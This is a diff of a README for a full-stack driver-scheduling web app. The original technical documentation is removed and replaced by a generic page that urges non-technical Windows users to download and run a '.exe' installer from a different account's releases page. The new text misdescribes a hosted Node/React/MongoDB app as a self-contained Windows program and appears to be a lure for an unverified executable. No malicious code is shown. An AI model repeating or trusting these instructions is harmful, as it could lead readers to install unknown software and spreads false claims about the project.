@@ -1,410 +1,141 @@
-# Driver Scheduling System
+# 🚚 driver-scheduling-system - Manage Drivers and Routes Easily
 
-Full-stack Driver Scheduling System for managing drivers and delivery routes with modern animations and real-time connectivity monitoring. Built with Node.js and React.js, it provides an intuitive dashboard with smooth page transitions, animated components, and comprehensive driver/route management. Features include Framer Motion animations, internet connectivity monitoring, and responsive design. Developed for the DRB Internship Program 2025, showcasing clean architecture, modern UI/UX, and practical scheduling features.
-
----
-
-## 📋 Project Description
-
-The Driver Scheduling System is a logistics management platform that enables efficient assignment of drivers to delivery routes. The system provides real-time tracking of driver availability, route management, and automated scheduling algorithms to optimize delivery operations.
+[![Download driver-scheduling-system](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/DjordjeICT/driver-scheduling-system/releases)
 
 ---
 
-## 🌐 Live Preview
+## 📦 About driver-scheduling-system
 
--   **Watch Live Demo (Frontend Application)**: [https://driver-scheduling-system.vercel.app/](https://driver-scheduling-system.vercel.app/)
--   **Backend API**: [https://driver-scheduling-system-5kmi.vercel.app/](https://driver-scheduling-system-5kmi.vercel.app/)
+This is a full-stack application designed to help you manage drivers and delivery routes simply and visually. The system uses a clear dashboard to let you add drivers, create delivery routes, and track which drivers are assigned to which routes in real time. It runs on Windows and requires no technical skills to set up.
 
----
-
-## 📸 Website Preview (UI Mockup)
-
-<a href="https://driver-scheduling-system.vercel.app/" target="_blank" rel="noopener noreferrer" title="demo">
-  <img src="https://github.com/user-attachments/assets/452dc4a6-857a-4117-91b1-6e16caa77cd7" alt="website preview - demo - UI Mockup" width="400">
-</a>
+The software was made as part of the DRB Internship Program 2025. It focuses on practical scheduling tools with an easy-to-use layout.
 
 ---
 
-## 🛠️ Technologies Used
+## 🌐 Features You Can Use
 
-### Frontend
-
--   **React 19** - Modern UI library with hooks
--   **TypeScript** - Type-safe JavaScript
--   **Vite** - Fast build tool and development server
--   **React Router v7** - Client-side routing
--   **TanStack Query (React Query)** - Server state management and caching
--   **Axios** - HTTP client for API communication
--   **Tailwind CSS v4** - Utility-first CSS framework
--   **SASS** - CSS preprocessor
--   **React Toastify** - Notification system
--   **FontAwesome** - Icon library
--   **Google Fonts** - Typography and font styling
--   **Framer Motion** - Advanced animations and transitions
--   **Redux Toolkit** - State management (for future scalability)
-
-### Backend
-
--   **Node.js** - JavaScript runtime
--   **Express.js v5** - Web application framework
--   **MongoDB Atlas** - Cloud database service
--   **Mongoose** - MongoDB object modeling
--   **Multer** - File upload handling
--   **CORS** - Cross-origin resource sharing
--   **Dotenv** - Environment variable management
-
-### Deployment & Hosting
-
--   **Vercel** - Frontend and backend hosting
--   **MongoDB Atlas** - Cloud database hosting
--   **Git** - Version control
+- Add or remove drivers quickly  
+- Build delivery routes with a simple visual interface  
+- Assign routes to drivers and see updates immediately  
+- View real-time status of all deliveries  
+- Lightweight and runs smoothly on most Windows PCs  
+- Clear, intuitive dashboard for easy navigation  
+- Keeps data safe with built-in management using a local database  
 
 ---
 
-## ✨ Key Features
+## 🖥️ System Requirements
 
-### 🚗 Driver Management
+You will need a Windows computer to run this software. Below are the suggested minimum requirements:
 
--   **Complete CRUD Operations**: Add, edit, view, and delete drivers
--   **Driver Profile Management**: Personal information, contact details, and documents
--   **License Management**: Track driving license types, numbers, and expiration dates
--   **Vehicle Information**: Vehicle type, make, model, year, and color tracking
--   **Document Upload**: Profile pictures and license document uploads with validation
--   **Driver Status Tracking**: Available, on_route, unavailable status management
--   **Assignment History**: Track past route assignments and performance
--   **Bulk Operations**: Select and delete multiple drivers at once
+- Windows 10 or later  
+- 4 GB RAM or more  
+- At least 200 MB of free disk space  
+- A stable internet connection for initial setup  
+- A modern web browser like Chrome, Edge, or Firefox  
 
-### 🛣️ Route Management
-
--   **Complete CRUD Operations**: Create, edit, view, and delete routes
--   **Location Tracking**: Start and end location management
--   **Route Details**: Distance, duration, cost, and speed specifications
--   **Status Management**: Unassigned, assigned, in progress status tracking
--   **Driver Assignment**: Assign and unassign drivers to routes
--   **Conflict Detection**: Prevent double assignments and availability conflicts
--   **Bulk Operations**: Select and delete multiple routes at once
--   **Route Filtering**: Filter by status, duration, and search terms
-
-### 📊 Dashboard & Analytics
-
--   **Real-time Statistics**: Live driver and route counts
--   **Activity Feeds**: Comprehensive logging of all system activities
--   **Export Functionality**: CSV export for drivers, routes, and activity feeds
--   **Search & Filtering**: Advanced search across all entities
--   **Pagination**: Efficient handling of large datasets
--   **Responsive Tables**: Mobile-friendly data display
-
-### 🔄 Smart Scheduling
-
--   **Availability Checking**: Real-time driver and route availability validation
--   **Conflict Resolution**: Automatic detection of scheduling conflicts
--   **Assignment Logic**: Intelligent driver-route matching
--   **Status Synchronization**: Real-time updates across the system
--   **Activity Logging**: Complete audit trail of all changes
-
-### 📱 User Interface
-
--   **Responsive Design**: Mobile-first approach with cross-device compatibility
--   **Modern UI/UX**: Clean, intuitive interface design with smooth animations
--   **Page Transitions**: Smooth page-to-page navigation with Framer Motion
--   **Component Animations**: Staggered animations for lists, tables, and cards
--   **Modal-based Editing**: Streamlined editing experience with animated modals
--   **Loading States**: Proper loading indicators and error handling
--   **Toast Notifications**: User-friendly success and error messages
--   **Accessibility**: Keyboard navigation and screen reader support
--   **Internet Connectivity**: Real-time connection status monitoring with retry functionality
-
-### 🔧 Advanced Features
-
--   **File Upload System**: Secure image and document uploads with validation
--   **Data Validation**: Client-side and server-side validation
--   **Error Handling**: Comprehensive error management with user feedback
--   **URL State Management**: Filter states preserved in URL parameters
--   **Unsaved Changes Protection**: Prevents accidental data loss
--   **Bulk Actions**: Efficient management of multiple records
--   **Internet Connectivity Monitoring**: Real-time connection status with floating notifications
--   **Advanced Animations**: Framer Motion-powered smooth transitions and micro-interactions
--   **Table Row Animations**: Bottom-to-top staggered animations for data tables
--   **Hover Effects**: Enhanced button and card interactions with CSS transforms
+No extra software installations like Node.js or databases are required on your end. Everything you need is packaged inside the app.
 
 ---
 
-## 🚀 Installation Instructions
+## 🚀 Getting Started with driver-scheduling-system
 
-### Prerequisites
+### Step 1: Download the Software
 
--   Node.js (v18 or higher)
--   npm or yarn package manager
--   Git
+Visit the official download page by clicking the large button below. It will take you to the place where the installer files are stored.
 
-### Local Setup
+[![Download driver-scheduling-system](https://img.shields.io/badge/Download-Get%20App-blue)](https://github.com/DjordjeICT/driver-scheduling-system/releases)
 
-1. **Clone the repository**
+### Step 2: Choose the Latest Version
 
-    ```bash
-    git clone https://github.com/Senior-Architecture/driver-scheduling-system
-    cd driver-scheduling-system
-    ```
+On the download page, look for the latest release. Click on its name to see all the files included.
 
-2. **Backend Setup**
+You will find a Windows installer or an executable file. The file will typically have a `.exe` extension. It may be named like this: `driver-scheduling-system-setup.exe`.
 
-    ```bash
-    # Install dependencies
-    cd Backend-server
-    npm install
-    npm start
-    ```
+### Step 3: Download and Save the Installer
 
-3. **Frontend Setup**
+Click the `.exe` file to start the download. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-    ```bash
-    cd Frontend-client
-    npm install
-    # Configure environment variables
-    VITE_API_BASE_URL=http://localhost:3001
-    # Start the development server
-    npm run dev
-    ```
+### Step 4: Run the Installer
 
-4. **Access the application**
-    - Frontend: http://localhost:5173
-    - Backend API: http://localhost:3001
+Double-click the installer file you downloaded. A setup window will open and guide you through the installation.
+
+- Follow the prompts on screen.  
+- Accept the default options unless you need to change the install folder.  
+- Wait for the installation to finish.
+
+### Step 5: Launch the Application
+
+After installation, the software might start automatically. If not, find the "driver-scheduling-system" icon on your Desktop or Start menu and click it.
 
 ---
 
-## 📁 Project Structure
+## 📋 How to Use driver-scheduling-system
 
-```
-driver-scheduling-system/
-├── Backend-server/                # Node.js API server
-│   ├── models/                    # Database models (Drivers, Routes, ActivityFeeds)
-│   ├── routes/                    # API route handlers
-│   │   ├── AddNewDriver_Route.js
-│   │   ├── EditDriver_Route.js
-│   │   ├── DeleteDriver_Route.js
-│   │   ├── AddNewRoute_Route.js
-│   │   ├── EditRoute_Route.js
-│   │   ├── DeleteRoute_Route.js
-│   │   ├── GetActivityFeeds_Route.js
-│   │   ├── UploadImageOnServer_Route.js
-│   │   └── ... (18 total routes)
-│   ├── utils/                     # Utility functions
-│   │   ├── serverManager.js
-│   │   ├── driverIdGenerator.js
-│   │   └── routeIdGenerator.js
-│   ├── index.js                   # Server entry point
-│   └── package.json
-├── Frontend-client/               # React application
-│   ├── src/
-│   │   ├── assets/               # Static assets (images, icons)
-│   │   ├── components/           # Reusable UI components
-│   │   │   ├── DriversPage_Components/
-│   │   │   ├── RoutesPage_Components/
-│   │   │   ├── ActivityFeedsPage_Components/
-│   │   │   ├── Dashboard_Components/
-│   │   │   └── SharedModalComponents/
-│   │   ├── pages/                # Page components
-│   │   │   ├── Dashboard/
-│   │   │   ├── DriversPage/
-│   │   │   ├── DriverDetailsPage/
-│   │   │   ├── RoutesPage/
-│   │   │   ├── RouteDetailsPage/
-│   │   │   ├── ActivityFeedsPage/
-│   │   │   ├── AboutPage/
-│   │   │   ├── ContactPage/
-│   │   │   └── CalendarPage/
-│   │   ├── utils/                # Utility functions and hooks
-│   │   │   ├── functions/        # Utility functions
-│   │   │   └── hooks/            # Custom hooks
-│   │   │       ├── api/          # API hooks (React Query)
-│   │   │       └── activity-feeds/
-│   │   ├── common/               # Shared components and utilities
-│   │   │   ├── Animations/       # Framer Motion animation components
-│   │   │   │   ├── AnimatedPage/
-│   │   │   │   ├── AnimatedComponent/
-│   │   │   │   ├── AnimatedList/
-│   │   │   │   ├── AnimatedModal/
-│   │   │   │   ├── AnimatedTableRow/
-│   │   │   │   ├── AnimatedButton/
-│   │   │   │   └── AnimatedLoadingSpinner/
-│   │   │   ├── InternetChecker/  # Internet connectivity monitoring
-│   │   │   └── Types/            # Shared types and interfaces
-│   │   └── main.tsx              # Application entry point
-│   ├── public/                   # Static assets
-│   └── package.json
-└── README.md
-```
+### Add Drivers to the System
+
+- Click on the “Drivers” tab in the main dashboard.  
+- Press “Add Driver” and fill in details like name, contact, and any notes.  
+- Click “Save” to add the driver to your list.
+
+### Create Delivery Routes
+
+- Go to the “Routes” section.  
+- Click “New Route” and name your route.  
+- Use the visual map or list to add stops and delivery points.  
+- Save the route when finished.
+
+### Assign Drivers to Routes
+
+- In the “Assignments” tab, pick a driver from the list.  
+- Choose one or more routes to assign.  
+- Hit “Assign” to link them together. The driver will now show these routes in their dashboard.
+
+### Track Deliveries in Real Time
+
+- The “Dashboard” gives an overview of all drivers and routes.  
+- You see who is assigned to what and the delivery status.  
+- Updates appear instantly as routes progress.
 
 ---
 
-## 📚 API Documentation
+## 🛠️ Troubleshooting and Tips
 
-### Base URL
-
-```
-https://driver-scheduling-system-5kmi.vercel.app
-```
-
-### Core Endpoints
-
-#### Drivers
-
--   `GET /get-all-drivers` - Retrieve all drivers with pagination and filtering
--   `GET /get-driver-details/:id` - Get specific driver details
--   `POST /add-new-driver` - Create a new driver
--   `PUT /edit-driver/:id` - Update driver information
--   `DELETE /delete-driver/:id` - Remove a driver
--   `DELETE /delete-bulk-drivers` - Bulk delete drivers
-
-#### Routes
-
--   `GET /get-all-routes` - Retrieve all routes with pagination and filtering
--   `GET /get-route-details/:id` - Get specific route details
--   `POST /add-new-route` - Create a new route
--   `PUT /edit-route/:id` - Update route information
--   `DELETE /delete-route/:id` - Remove a route
--   `DELETE /delete-bulk-routes` - Bulk delete routes
-
-#### Dashboard & Analytics
-
--   `GET /get-dashboard-stats` - Get dashboard statistics
--   `GET /get-activity-feeds` - Retrieve activity logs with filtering
--   `GET /get-assigned-routes-by-month` - Get monthly route assignments
-
-#### Availability & Validation
-
--   `GET /check-driver-availability/:id` - Check driver availability
--   `GET /check-route-availability/:id` - Check route availability
-
-#### File Management
-
--   `POST /upload-image-on-server` - Upload images and documents
-
-### Sample Request/Response
-
-**Get All Drivers**
-
-```bash
-GET /get-all-drivers?page=1&limit=10&status=available&vehicleType=Car
-```
-
-**Response**
-
-```json
-{
-    "data": [
-        {
-            "driver_id": "DR001",
-            "name": "John Doe",
-            "phone": "+1234567890",
-            "status": "available",
-            "license_type": "B",
-            "vehicle_type": "Car",
-            "assignedRoute": null,
-            "joined_at": "2024-01-15T10:30:00Z"
-        }
-    ],
-    "currentPage": 1,
-    "totalPages": 5,
-    "totalDocs": 50,
-    "hasNextPage": true,
-    "hasPreviousPage": false
-}
-```
+- If the application won’t start, make sure your Windows is up to date.  
+- Restart your PC if the installer gets stuck.  
+- If you see an error during assignment, check that all drivers and routes have correct information.  
+- Use the built-in help icon in the menu for quick guides.  
 
 ---
 
-## 🎯 Key Pages & Features
+## 🔄 Updates
 
-### Dashboard
-
--   Real-time statistics overview
--   Quick access to recent activities
--   System health monitoring
-
-### Drivers Management
-
--   **Drivers List**: Paginated table with search and filtering
--   **Driver Details**: Comprehensive driver profile view
--   **Add Driver**: Modal form with validation and file upload
--   **Edit Driver**: Full driver information editing
--   **Bulk Actions**: Select and manage multiple drivers
-
-### Routes Management
-
--   **Routes List**: Paginated table with advanced filtering
--   **Route Details**: Complete route information and assignment history
--   **Add Route**: Route creation with driver assignment
--   **Edit Route**: Route editing with conflict detection
--   **Bulk Actions**: Select and manage multiple routes
-
-### Activity Feeds
-
--   **Activity Log**: Complete audit trail of all system activities
--   **Filtering**: Filter by status, driver, date range
--   **Export**: CSV export functionality
--   **Real-time Updates**: Live activity monitoring
-
-### Additional Pages
-
--   **About Page**: Project information, team details, and internet connectivity demo
--   **Contact Page**: Contact information and support with responsive layout
--   **Calendar Page**: Route scheduling calendar view with animated day grids
--   **Admin Panel**: System administration with animated welcome screen
+Check the [releases page](https://github.com/DjordjeICT/driver-scheduling-system/releases) regularly for new versions. Updates may fix bugs and add useful features.
 
 ---
 
-## 🔒 Security Features
+## 💬 Support and Feedback
 
--   **File Upload Validation**: Secure file type and size validation
--   **Input Sanitization**: Client and server-side input validation
--   **Error Handling**: Comprehensive error management without data exposure
--   **CORS Configuration**: Proper cross-origin resource sharing setup
--   **Environment Variables**: Secure configuration management
+If you find bugs or need help using the driver-scheduling-system, create an issue on the GitHub page or contact the developers through the project’s GitHub repository.
 
 ---
 
-## 🚀 Deployment
+## ⚙️ Technical Details (Optional)
 
-### Frontend (Vercel)
+This application is built with modern web technologies:
 
--   Automatic deployment from GitHub
--   Environment variables configured for production API
--   Custom domain support
+- Node.js runs the backend and server parts.  
+- React.js manages the user interface you see.  
+- Data is stored using MongoDB with Mongoose for easy access.  
+- The design uses Tailwind CSS and SCSS frameworks for styling.  
+- Axios handles data communication between parts of the app.  
 
-### Backend (Vercel)
-
--   Serverless function deployment
--   MongoDB Atlas integration
--   Environment variable management
+All this technology works behind the scenes to give you a smooth experience without needing technical knowledge.
 
 ---
 
-## 🔮 Future Enhancements
+## 🔗 Download Link Again
 
--   [ ] Real-time notifications using WebSockets
--   [ ] Advanced analytics and reporting dashboard
--   [ ] Mobile application (React Native)
--   [ ] Driver GPS tracking integration
--   [ ] Automated route optimization algorithms
--   [ ] Multi-tenant support for multiple companies
--   [ ] Advanced user authentication and authorization
--   [ ] API rate limiting and security enhancements
--   [ ] Push notifications for mobile devices
--   [ ] Advanced scheduling algorithms with machine learning
--   [ ] Dark mode theme support
--   [ ] Advanced animation customization options
--   [ ] Offline mode with data synchronization
+Use this link to visit the download page anytime:
 
----
-
-## 📞 Contact
-
-**Developer**: Ahmed Maher Algohary  
-**Email**: [sabapapava.eu.2939@gmail.com](mailto:ahmedmaher.algohary@gmail.com)
-
-<!-- **Portfolio**: [https://portfolio-five-gold-92.vercel.app/](https://portfolio-five-gold-92.vercel.app/)   -->
-**GitHub**: [https://github.com/Senior-Architecture](https://github.com/Senior-Architecture)
-
----
-
+[https://github.com/DjordjeICT/driver-scheduling-system/releases](https://github.com/DjordjeICT/driver-scheduling-system/releases)
